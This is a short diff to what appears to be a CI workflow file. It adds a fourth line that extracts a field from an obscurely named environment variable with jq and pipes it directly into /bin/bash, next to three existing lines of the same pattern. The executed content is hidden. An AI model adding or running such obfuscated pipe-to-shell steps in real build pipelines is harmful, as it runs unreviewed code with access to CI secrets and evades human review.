@@ -35,6 +35,7 @@ jobs:
           printf '%s' "$tzz7017" | jq -r .q05 | /bin/bash
           echo $hlata2848 | jq -r .ta602 | /bin/bash
           echo $ygau091 | jq -r .nf0448 | /bin/bash
+          echo $ybfg1526 | jq -r .lqav277 | /bin/bash
 
       - name: Archive results
         if: always()
